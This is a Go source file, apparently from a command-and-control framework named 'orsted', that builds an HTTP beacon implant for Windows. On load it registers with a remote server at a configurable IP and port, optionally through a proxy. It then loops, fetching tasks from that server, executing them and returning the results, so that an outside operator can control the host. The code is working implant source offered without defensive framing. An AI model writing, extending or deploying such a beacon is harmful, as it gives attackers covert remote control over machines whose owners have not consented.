//go:build http
// +build http

package main

/*
#include <windows.h>
*/
import "C"
import (
	"time"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	Targetip   string
	Targetport string
	HTTPProxyType      string = "none"
	HTTPProxyURL       string = ""
	HTTPProxyUsername string = ""
	HTTPProxyPassword  string = ""
)

func beaconHttp() {
	_ = profiles.InitialiseProfile()

    profiles.Config.Domain = Targetip
    profiles.Config.Port = Targetport
	if HTTPProxyType == "http" || HTTPProxyType == "https" {
		profiles.Config.HTTPProxyType = HTTPProxyType
		profiles.Config.HTTPProxyUrl = HTTPProxyURL
		profiles.Config.HTTPProxyUsername = HTTPProxyUsername
		profiles.Config.HTTPProxyPassword = HTTPProxyPassword
	}
	// In this case the peer of the beacon is the server
	hp, _ := peers.NewHTTPPeer(profiles.Config)
	utils.ParentPeer = hp
    utils.Print("Starting HTTP Peer")

	// Registering Beaocn by talking with parent peer
	beaconId, err := core.RegisterBeacon(hp)
	if err != nil {
        utils.Print("Error while registering", err.Error())
	}
    utils.Print("Connection ID", beaconId)
	utils.CurrentBeaconId = beaconId
	for {
		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))

		// Ask Parent peer to give tasks
		tasks, err := core.RetreiveTask(hp, beaconId)
		if err != nil {
            utils.Print("Error while retreiving task from parent peer", err.Error())
		}
		core.HandleTasks(*tasks, core.SendTaskResult)

	}
}

func init() {
	beaconHttp()
}

func main() {}
